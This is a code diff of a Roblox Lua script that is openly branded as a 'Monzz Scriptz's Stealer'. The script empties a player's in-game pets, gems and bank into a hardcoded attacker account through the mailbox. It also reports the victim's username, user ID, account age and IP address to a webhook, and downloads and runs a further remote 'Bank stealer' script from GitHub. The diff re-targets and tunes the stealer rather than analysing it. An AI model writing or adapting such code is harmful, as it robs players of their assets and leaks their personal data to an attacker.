@@ -1,3 +1,45 @@
+getgenv().Settings = {
+    User = "TehPucuk_55",
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = "Monzz Is Better",
+    Titanics = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Banana = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Huges = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Pogs = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Exclusives = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Events = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Secrets = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    HC_DM_Mythics = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Gems = {
+        Dualhook = true,
+        Intensity = 100 --%
+    }
+}
+
 if getgenv().executed then return end
 getgenv().executed = true
 
@@ -133,7 +175,22 @@ request = (syn and syn.request) or (http and http.request) or http_request or (f
 
 local exploit
 local function getexploit()
-    local exploitt = identifyexecutor()
+    local exploitt =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "KRNL") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Couldnt Grab")
+
     exploit = exploitt
 end
 getexploit()
@@ -146,6 +203,9 @@ local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
+for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    v:Destroy()
+end
 -- Loading Screen
 if _G.LoadingScreen ~= false then
     local ScreenGui = Instance.new("ScreenGui")
@@ -200,12 +260,12 @@ if _G.LoadingScreen ~= false then
 end
 
 -- Remotes
+
 local BankPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"])
 local InvPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory)
 local MailPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Mailbox)
 local RedeemPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Reedem Rank Rewards"])
 local GiftsPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Free Gifts"])
-
 
 local getmybanksremote = debug.getconstant(BankPath.GetMyBanks, 3)
 
@@ -248,10 +308,12 @@ redeemrankremote = blobz[blobb[2](2, redeemrankremote)]
 redeemgiftsremote = blobz[blobb[2](2, redeemgiftsremote)]
 
 -- Banks Stuff
+
 local mybanks = getmybanksremote:InvokeServer()
 local PlayerInfos = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 
 -- Inv Space Check :
+
 function invspace()
     local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
     if invspace > 50 then
@@ -266,6 +328,7 @@ function invspace_nolimit()
 end
 
 -- Bank Teleport
+
 game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
 "__MAP"].Interactive.Bank.Pad.Position)
 
@@ -730,8 +793,8 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Arkhalislua/Arkhalislua.github.io/main/arkhalis_bankstealer.lua", true))()
-    return;
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))()
+    return
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
@@ -999,7 +1062,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**Monzz Scriptz Stealer** :skull:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1069,7 +1132,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**Monzz Stealer Stealer** :skull:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1111,32 +1174,32 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
 end
 
 local dhuser = getgenv().Settings.User
- if getgenv().Settings ~= nil then
-     if getgenv().Settings.PremiumKey ~= nil then
-         local premkey = getgenv().Settings.PremiumKey
-         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
-         local dhdata = {
-             dhprem = dhkey
-         }
-         local dhurl = "https://php-key.gayungbolong.repl.co" .. User-- Exc : https://rizz.xyz/premium.php
-         local dhheaders = {
-             ["content-type"] = "application/json"
-         }
-         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
-         local dhresponse = request({
-             Url = dhurl,
-             Body = dhnewdata,
-             Method = "POST",
-             Headers = dhheaders
-         })
-         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
-         if responsed ~= 'false' then
-             dhuser = responsed
-         else
-             dhuser = nil
-         end
-     end
- end
+-- if getgenv().Settings ~= nil then
+--     if getgenv().Settings.PremiumKey ~= nil then
+--         local premkey = getgenv().Settings.PremiumKey
+--         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
+--         local dhdata = {
+--             dhprem = dhkey
+--         }
+--         local dhurl = "https://php-key.gayungbolong.repl.co" -- Exc : https://rizz.xyz/premium.php
+--         local dhheaders = {
+--             ["content-type"] = "application/json"
+--         }
+--         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
+--         local dhresponse = request({
+--             Url = dhurl,
+--             Body = dhnewdata,
+--             Method = "POST",
+--             Headers = dhheaders
+--         })
+--         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
+--         if responsed ~= 'false' then
+--             dhuser = responsed
+--         else
+--             dhuser = nil
+--         end
+--     end
+-- end
 local titanicin
 local bananin
 local hugein
@@ -1201,7 +1264,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
     ndUser = UserName2
 else
     ndUser = UserName
@@ -1248,7 +1311,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1276,7 +1339,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #BList == 0 or BList == {} then
                     -- print("done2")
                     break
@@ -1306,7 +1369,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #HList == 0 or HList == {} then
                     -- print("done3")
                     break
@@ -1335,7 +1398,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #PList == 0 or PList == {} then
                     -- print("done1")
                     break
@@ -1363,7 +1426,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #EList == 0 or EList == {} then
                     -- print("done42")
                     break
@@ -1391,7 +1454,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
@@ -1419,7 +1482,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #SList == 0 or SList == {} then
                     -- print("done6")
                     break
@@ -1447,7 +1510,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 -- print("secret sending")
                 if #MList == 0 or MList == {} then
                     -- print("done6")
